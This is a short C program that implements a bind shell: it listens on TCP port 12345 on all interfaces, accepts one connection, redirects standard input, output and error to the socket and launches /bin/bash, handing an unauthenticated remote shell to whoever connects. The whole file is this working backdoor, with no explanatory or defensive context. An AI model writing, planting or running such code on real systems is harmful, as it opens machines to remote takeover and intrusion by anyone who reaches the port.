#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main(void){
 int new, sockfd = socket(AF_INET, SOCK_STREAM, 0);
 struct sockaddr_in sin;

 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr = 0;
 sin.sin_port = htons(12345); // big indian
 bind(sockfd, (struct sockaddr *)&sin, sizeof(sin));
 listen(sockfd, 5);
 new = accept(sockfd, NULL, 0);

 for(int i= 2; i>=0; i--)
   dup2(new, i);
 execl("/bin/bash", "sh", NULL);
 return 0;
}
